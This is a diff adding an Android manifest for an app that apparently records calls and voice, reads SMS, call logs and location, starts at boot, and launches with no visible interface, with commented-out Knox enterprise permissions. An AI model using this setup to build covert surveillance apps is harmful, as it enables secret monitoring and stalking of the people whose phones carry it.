@@ -1,0 +1,92 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.nabuapp.root.nabuapp_alpha">
+
+    <!-- <permission  android:name="" -->
+    <!-- android:protectionLevel="signature"> -->
+
+
+    <!-- </permission> -->
+    <!-- knox permissions -->
+    <!-- <uses-permission android:name="android.permission.sec.ENTERPRISE_DEVICE_ADMIN" /> -->
+    <!-- <uses-permission android:name="android.permission.sec.MDM_VPN" /> -->
+    <!-- <uses-permission android:name="android.permission.sec.MDM_APP_MGMT" /> -->
+    <!-- <uses-permission android:name="android.permission.sec.MDM_INVENTORY"/> -->
+    <!-- <uses-permission android:name="com.sec.enterprise.knox.permission.CUSTOM_SETTING"/> -->
+    <!-- <uses-permission android:name="com.sec.enterprise.knox.permission.KNOX_ATTESTATION"/> -->
+    <!-- call and voice recordings -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <!-- file system access -->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+
+    <!-- internet permissions -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:supportsRtl="true">
+        <activity
+            android:name=".MainActivity"
+            android:theme="@android:style/Theme.NoDisplay">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <receiver android:name=".BootReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+
+                <!--<category android:name="android.intent.category.HOME" />-->
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".LicenseActivationReceiver"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="edm.intent.action.license.status" />
+                <action android:name="edm.intent.action.knox_license.status" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".PhoneReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+            </intent-filter>
+        </receiver>
+
+        <service android:name=".CallRecorderService" />
+        <service android:name=".GetSMSAndCallsService" />
+        <service android:name=".VoiceRecorderService" />
+
+        <!--<receiver-->
+            <!--android:name=".CommandReceiver"-->
+
+            <!--android:enabled="true"-->
+            <!--android:exported="true">-->
+            <!--<intent-filter>-->
+                <!--<action android:name="com.nabuapp.root.nabuapp_alpha.VOICEREC_START" />-->
+                <!--<action android:name="com.nabuapp.root.nabuapp_alpha.VOICEREC_STOP" />-->
+
+            <!--</intent-filter>-->
+
+        <!--</receiver>-->
+    </application>
+
+</manifest>
